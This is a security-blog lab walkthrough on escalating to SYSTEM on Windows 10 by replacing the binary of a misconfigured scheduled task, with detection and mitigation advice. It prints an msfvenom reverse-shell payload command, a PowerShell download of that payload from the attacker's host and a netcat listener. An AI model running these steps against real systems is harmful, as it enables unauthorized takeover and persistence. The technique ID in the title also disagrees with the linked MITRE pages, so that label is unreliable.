@@ -1,0 +1,90 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: Scheduled Task/Job (T1573.005)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-scheduled-task-job-t1573-005/" rel="bookmark"><time class="entry-date published" datetime="2021-12-14T20:34:58+00:00">December 14, 2021</time><time class="updated" datetime="2025-05-18T15:18:09+00:00">May 18, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"> An attacker can <strong data-start="185" data-end="219">exploit Windows Task Scheduler</strong> to schedule <strong data-start="232" data-end="254">malicious programs</strong> for initial or recurrent execution. For <strong data-start="295" data-end="310">persistence</strong>, the attacker typically uses <strong data-start="340" data-end="366">Windows Task Scheduler</strong> to launch applications at system startup or at predefined intervals. Furthermore, the attacker executes <strong data-start="471" data-end="486">remote code</strong> under the context of a specified account to achieve <strong data-start="539" data-end="563">Privilege Escalation</strong>.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Task Scheduler</span></li>
+<li><span style="color: #000000;">Misconfigured Scheduled Task/Job</span></li>
+<li><span style="color: #000000;">Prerequisite</span></li>
+<li><span style="color: #000000;">Lab Setup</span></li>
+<li><span style="color: #000000;">Abusing Schedule Task/Job</span></li>
+<li><span style="color: #000000;">Detection</span></li>
+<li><span style="color: #000000;">Mitigation</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Task Scheduler</strong></span></h3>
+<p><span style="color: #000000;"> You can easily schedule an <strong data-start="625" data-end="642">automatic job</strong> using the <strong data-start="653" data-end="679">Task Scheduler service</strong>. When you utilize this service, you set up any program to run at a specific <strong data-start="756" data-end="773">date and time</strong> that suits your needs. Subsequently, <strong data-start="811" data-end="829">Task Scheduler</strong> evaluates the defined time or event criteria and runs the task once those conditions are met.</span></p>
+<h3><span style="color: #800000;"><strong>Misconfigured Scheduled Task/Job</strong></span></h3>
+<p><span style="color: #000000;">An attacker can perform execution, persistence or privilege escalation by abusing any script, program, or service that is running automatically through the task scheduler.</span></p>
+<p><span style="color: #000000;"><strong>Mitre ID:</strong> <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1053/005/">T1573.005</a></span><br/>
+Tactics: <a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0002">Execution</a></strong>, <strong><a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0003">Persistence</a></strong>, <strong><a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0004">Privilege Escalation</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
+<h3><span style="color: #800000;"><strong>Prerequisite</strong></span></h3>
+<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
+<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
+<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting the Scheduled Task/Job.</span></p>
+<h3><span style="color: #800000;"><strong>Lab Setup</strong></span></h3>
+<p><span style="color: #000000;">Run Task Scheduler from inside the program menu.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgxUywLx2gzclFBxNP_jXyyS_YtmjoZd5LNegYBUrQ6r4X8IDWTXNIIdz-HEKto3iQbyKhWEKo-2SwEK_sazOQZiz2JgFhFHnE-I_XX4gotg3TPgmASltdjyP3-OQDxL5nOWvsWVA__Xqu_unO1d6fAiNSGdHawmLmm_6lEeH7c7IfZHLy3EBRASQPozA=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step1:</strong> Explore the Task Schedule Library to create a new Task.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhQc0m6u1F5M7QkYjPF7BXDPET3Bb8uh_WOby-rslOXgmwcNiYu1LccfFtm42Z4qAcUTVnDhvjvGmiUN6SEjNoZBqIOfSQwp0fdspT-Fo2HOlEsXuDjEfgMxXFOiZDPYk-tA7omUO5AdiCC9YYAsNp89dY5MmkJF991QzRNUKIN804ylSqN-_FcjAjU3g=s16000"/></span></p>
+<p><span style="color: #000000;">Step2: Assign a task for the logged user to be executed as the highest privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEib-YK_eRoB0sFr8WEDYkld9p5nF0EoZlZiy138KjnW0kM7VH0NWQy-7jMkln4r5LiDX1Hi2F_6YvX0qIfwjGF0ToWpGQiofqDJYoCg-dfy2VNOd8SPxBs8rem30pEQpttmcsPyPGt0IpVgrW-mE5uWPjOGnOyruxZVZajL_IaHnQ9didGDvtqbcDSS2Q=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step3:</strong> Choose the Trigger option to initiate a scheduled task/job.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh0tL_DYbBaS39v93cJqiMNX8nzmMkIN0PE0pFA0ExT12zAvawxzKZJJyUHaOdp3sSSmP1XFe2avn47Ubf4czMvWah_5sQeF1J1cKYzf0LnP_YeJmpDCTpsZBp75uV_Ngf4qObUxVmqi3R4WQrUYJ9TFZkYWDKNEe4xOLg2lATPQNVZK2Oo9EFJi1Z6Nw=s16000"/></span></p>
+<p><span style="color: #000000;">Step4: Here we have scheduled the task for recurrence occurrence.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjN4BPJD_dKWKJ6vZFhpehMMuHbt7tOFNtrBNqLp4PHsFenOkSOF7i0bUfIQtEgj6C_a5vlmb6F9AldZZqq6vNRt9l2kueN47OQqrCL5S143OWSeNY7gKTFwwuw-vTxPXapwD-CKg2skEejKv8Zz2WQpSFyppGNx4m2ixgpec4-jMBDRUxwTapCVCR1TA=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step5:</strong> When you create a task, you must specify the action that will occur when your task starts.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgDUoBs1uUV_hYlZ8rhGjpwrDc6_wdnRCHZbUZLgfuwDQ9fuCEnvG8hihz1ieg-gebNIpllVAdJgi9tqg-2Wn6IhkewQTXeUsB87TfJtTb51BsXfiotNmC_GaTdNNS0F4dwOF0Dp_pABbBxiAGV5v1oMcl7wRJktib5zaMzVHW8mkODq_9gYDVlwuNtSw=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step6:</strong> Specify the type of action to be performed by a scheduled task. For example schedule backup of a system through some executable program.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_CUQuqJ4Zsf4_uil5ebSSft66t-OJaARe8p25ijOJSrLDGDXVxdCKnX-QfFK6pWINvl2g5R44WE61fAKU2b7XtZyIKToKHGRAwz7DEEuzQ-9TNQHP-IFF9lgTsFXMU4IQFuaLjrv9NiyVSB9BDp4IiAOvLhTWNPQTKB7BCqepxq4hhKaklD1KZh-czg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Step7:</strong> Thus schedule tasks will be triggered every day at a specific time for taking backup or schedule job to define as action.</span></p>
+<h3><span style="color: #800000;"><strong>Abusing Schedule Task/Job</strong></span></h3>
+<p><span style="color: #000000;"><strong>Step8:</strong> An attacker can escalate privileges by exploiting Schedule Task/Job. Following an initial foothold, we can query to obtain the list for the scheduled task.</span></p>
+<p><span style="color: #000000;">schtasks /query /fo LIST /V</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh4l0o6UsTbiD6fgvE0msxlCwjUdW8rcaa6nuKj3zh0qwu0cXbpRQrHb7dS552Ul7kXcT0-zJpM5qjClMmvToNU8m3pGkAamxwnTR2_xjjUL_ZOhxHd7PLBBq-rrDlnDlT6IFNgXRahrXLmAegDtEnbTge1tdDHblHb3LPOLXiEASxf0yJHK-ZDZZPY1g=s16000"/></span></p>
+<p><span style="color: #000000;">This helps an attack to understand which application is attached to execute Job at what time.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEilpAqXwurSvH28WVNn-OU7Mg2yY2OznrUZD6chS6EKZFxuu8BR3RHMQ4_4ZGsNpdVAgTUFn81axc82E5NGXF_o2YAJaD0BaVaxH_XHkSPEEF0MTCl19d5fHlGl85EcJ2RygF1SGOwFrkaDvhrxf6LQrNOKCJSMIohjgQ_Xf2xQ001H5M-IZNLZbwdTdA=s16000"/></span></p>
+<p><span style="color: #000000;"> To obtain a <strong data-start="969" data-end="986">reverse shell</strong> as <strong data-start="990" data-end="1013">NT Authority SYSTEM</strong>, first create a <strong data-start="1030" data-end="1052">malicious EXE file</strong> that a <strong data-start="1060" data-end="1078">scheduled task</strong> can execute. Using <strong data-start="1098" data-end="1110">Msfvenom</strong>, we then generate the EXE file and inject it into the <strong data-start="1165" data-end="1182">target system</strong> accordingly.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe &gt; shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEic3OJTpSPuLdvMs19--Ki0lv6r7eU5qIroSl5bvkpbD7iYHv3Cpl2G9bR1kuYZA0AoDpJTb37EhQB1L_DR0Q0NB3uAeq0924ScDPDsZHhuK00zmfOEUvLWiTmsP_1j6kcLZLR7s2UFGQ8Q9wIQtNK72383PvIsBdr29dDJn67u19PAAFdHL6SrC6DEdA=s16000"/></span></p>
+<p><span style="color: #000000;">To abuse the scheduled Task, the attacker will either modify the application by overwriting it or may replace the original file from the duplicate. To insert a duplicate file in the same directory, we rename the original file as a file.bak.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgI3Pw7-kDCEcfiokyRvOecEHfGA4W2wDKOj8Xrf6qmr8ttUgnTsT7i7X3qZWBxge75cAohrvbOZnh0b4dP7S79FUEHlq9gU8cirx3OihhlZxLASLl_v1qfPATEyfiMml7-FcrQ_mxLYVbUAnBJtoLnC-Y7cq5vAFOl2_hzkX_UpzPpH50E5wW7nkgHRw=s16000"/></span></p>
+<p><span style="color: #000000;">Then downloaded malicious file.exe in the same directory with the help of wget command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.1.3/shell.exe –o file.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh0BK0h0d_U8F-kx7Gve1ECDlX5vxVzlWtilRcvu8rJFwWtjyC_0ZPaB7rEFvS2Mxhs86LstdrjDsa9xvI6BGCVqCb0y_w-4Y4O9My1i0bhzM41ZJOO05BGUhDWAnVcOoIzu_uhNOTVYOsqMxYz5J3UqnzBP7V-PUbZiEtRpM4dzl_Ymq5dOBv_fnZR0Q=s16000"/></span></p>
+<p><span style="color: #000000;">Once the duplicate file.exe is injected in the same directory then, the file.exe will be executed automatically through Task Scheduler. As attackers make sure that netcat listener must be at listening mode for obtaining reverse connection for privilege shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888
+whoami /priv</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEizTEbNW-IMvsRjh_4bKOcb9VPrFJ6ioD-C_KV2rUdY13HQ5gEmqGL8-2GbQfPJ-InxiKOQqBlF80y6kL0as7HlUkhJPD_FHDAazlI_ON6YbbJhfBJMjj9sC9JO_Ys-NZWrx6rSjxACprB5kBeEAaHpNc_7RxoH1GrDqujAAskSMHU-ZVggYC4XDGaxXA=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Detection </strong></span></h3>
+<ol>
+<li><span style="color: #000000;">Tools such as <a style="color: #000000;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns"><span style="color: #0000ff;"><strong>Sysinternals Autoruns</strong></span></a> can detect system changes like showing presently scheduled jobs.</span></li>
+<li><span style="color: #000000;">Tools like <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a> </strong></span>&amp; <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explore</a></strong></span> may help to identify remote connections for suspicious services or processes.</span></li>
+<li><span style="color: #000000;">View Task Properties and History: To view a task’s properties and history by using a command line</span></li>
+</ol>
+<p><span style="color: #000000;">Schtasks /Query /FO LIST /V</span></p>
+<ol start="4">
+<li><span style="color: #000000;">Enable the “Microsoft-Windows-TaskScheduler/Operational” configuration inside the event logging service to report scheduled task creation and updates.</span></li>
+</ol>
+<h3><span style="color: #800000;"><strong>Mitigation</strong></span></h3>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGYqhbAYA9lXbxME-m6uccDRnzmKtaeYorPVTMc_Xg321Bu4WONGfU1FKBr0szE-EQYfYBSkYstQ7Ze_HqTbzcizyU3vrpwRerbiTI6XqOVEi4xKe52HYpkYRKScNYnshCuqIW2z7KxAtAjDsPVQ3GbYqrQ-TaRVbEMKDnRKOiwB-O6dTNR50wSoZbGw=s16000"/></span></p>
+<ol>
+<li><span style="color: #000000;">Perform an audit scan to find out week or misconfiguration with the help of automated script using tools such as <strong>WinPeas, SharpUp</strong>, etc. Read more from here “<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/window-privilege-escalation-automated-script/">Window Privilege Escalation: Automated Script</a></strong></span>”.</span></li>
+<li><span style="color: #000000;">Make sure the scheduled task should not be run as SYSTEM.</span></li>
+</ol>
+<p><span style="color: #000000;">Configure scheduled tasks to execute as the authenticated account instead of SYSTEM. The associated Registry key is located at <strong>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl.</strong></span></p>
+<p><span style="color: #000000;">The setting can be configured through GPO: </span></p>
+<p><span style="color: #000000;"><strong>Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled</strong></span></p>
+<p><span style="color: #000000;"><strong>Reference</strong>:</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1053/002/">https://attack.mitre.org/techniques/T1053/002/</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
